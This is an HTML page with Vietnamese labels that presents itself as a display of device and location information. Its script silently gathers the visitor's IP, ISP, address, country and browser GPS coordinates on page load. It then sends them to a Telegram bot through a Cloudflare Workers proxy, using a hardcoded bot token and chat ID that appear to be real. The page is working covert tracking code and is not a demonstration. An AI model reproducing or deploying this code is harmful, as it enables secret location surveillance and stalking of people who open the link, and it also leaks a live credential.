<!DOCTYPE html>
<html lang="vi">
<head>
  <meta charset="UTF-8">
  <title>ThÃ´ng tin thiáº¿t bá»‹ & vá»‹ trÃ­</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    body {
      background-color: #0f0f0f;
      color: #fff;
      font-family: monospace;
      padding: 20px;
    }
    h1 { color: #00ffff; }
    .info {
      margin: 6px 0;
      padding: 6px 12px;
      background: #1e1e2e;
      border-left: 4px solid #00ffff;
      border-radius: 4px;
    }
    .label { color: #aaa; }
    .value { color: #0ff; }
  </style>
</head>
<body>
  <h1>ThÃ´ng tin thiáº¿t bá»‹ & vá»‹ trÃ­</h1>
  <div class="info"><span class="label">ğŸ•’ Thá»i gian:</span> <span class="value" id="time"></span></div>
  <div class="info"><span class="label">ğŸŒ IP:</span> <span class="value" id="ip"></span></div>
  <div class="info"><span class="label">ğŸ¢ ISP:</span> <span class="value" id="isp"></span></div>
  <div class="info"><span class="label">ğŸ™ï¸ Äá»‹a chá»‰:</span> <span class="value" id="address"></span></div>
  <div class="info"><span class="label">ğŸŒ Quá»‘c gia:</span> <span class="value" id="country"></span></div>
  <div class="info"><span class="label">ğŸ§­ Kinh Ä‘á»™ (IP):</span> <span class="value" id="lon"></span></div>
  <div class="info"><span class="label">ğŸ§­ VÄ© Ä‘á»™ (IP):</span> <span class="value" id="lat"></span></div>
  <div class="info"><span class="label">ğŸ“ Kinh Ä‘á»™ (GPS):</span> <span class="value" id="gpsLon"></span></div>
  <div class="info"><span class="label">ğŸ“ VÄ© Ä‘á»™ (GPS):</span> <span class="value" id="gpsLat"></span></div>

  <script>
    const TELEGRAM_BOT_TOKEN = '7550142487:AAH_xOHuyHr0C2nXnQmkWx-b6-f1NSDXaHo'; // â† Thay táº¡i Ä‘Ã¢y
    const TELEGRAM_CHAT_ID = '-1002380729123';     // â† Thay táº¡i Ä‘Ã¢y

    const API_BASE = `https://winter-hall-f9b4.jayky2k9.workers.dev/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

    let info = {
      time: new Date().toLocaleString(),
      ip: "Äang táº£i...",
      isp: "",
      address: "",
      country: "",
      lat: "",
      lon: "",
      gpsLat: "",
      gpsLon: ""
    };

    let gpsLoaded = false;
    let ipLoaded = false;
    let sent = false;

    document.getElementById("time").textContent = info.time;

    fetch("https://ipwho.is/")
      .then(res => res.json())
      .then(data => {
        info.ip = data.ip;
        info.isp = data.connection?.org || 'KhÃ´ng rÃµ';
        info.address = `${data.region}, ${data.city}, ${data.postal || ''}`.replace(/, $/, '');
        info.country = data.country;
        info.lat = data.latitude;
        info.lon = data.longitude;

        document.getElementById("ip").textContent = info.ip;
        document.getElementById("isp").textContent = info.isp;
        document.getElementById("address").textContent = info.address;
        document.getElementById("country").textContent = info.country;
        document.getElementById("lat").textContent = info.lat;
        document.getElementById("lon").textContent = info.lon;

        ipLoaded = true;
        sendIfReady();
      });

    if ("geolocation" in navigator) {
      navigator.geolocation.getCurrentPosition(
        pos => {
          info.gpsLat = pos.coords.latitude;
          info.gpsLon = pos.coords.longitude;
          gpsLoaded = true;
          document.getElementById("gpsLat").textContent = info.gpsLat;
          document.getElementById("gpsLon").textContent = info.gpsLon;
          sendIfReady();
        },
        () => {
          gpsLoaded = true;
          info.gpsLat = "Tá»« chá»‘i";
          info.gpsLon = "Tá»« chá»‘i";
          document.getElementById("gpsLat").textContent = "Tá»« chá»‘i";
          document.getElementById("gpsLon").textContent = "Tá»« chá»‘i";
          sendIfReady();
        }
      );
    } else {
      gpsLoaded = true;
      info.gpsLat = "KhÃ´ng há»— trá»£";
      info.gpsLon = "KhÃ´ng há»— trá»£";
      sendIfReady();
    }

    function sendIfReady() {
      if (ipLoaded && gpsLoaded && !sent) {
        sent = true;

        const message = `
ğŸ“¡ [THÃ”NG TIN TRUY Cáº¬P]

ğŸ•’-Thá»i gian: ${info.time}
ğŸŒ-IP: ${info.ip}
ğŸ™ï¸-Äá»‹a chá»‰: ${info.address}
ğŸŒ-Quá»‘c gia: ${info.country}
ğŸ“-VÄ© Ä‘á»™ (IP): ${info.lat}
ğŸ“-Kinh Ä‘á»™ (IP): ${info.lon}
ğŸ“-VÄ© Ä‘á»™ (GPS): ${info.gpsLat}
ğŸ“-Kinh Ä‘á»™ (GPS): ${info.gpsLon}
        `.trim();

        fetch(API_BASE, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: message
          })
        });
      }
    }
  </script>
</body>
</html>
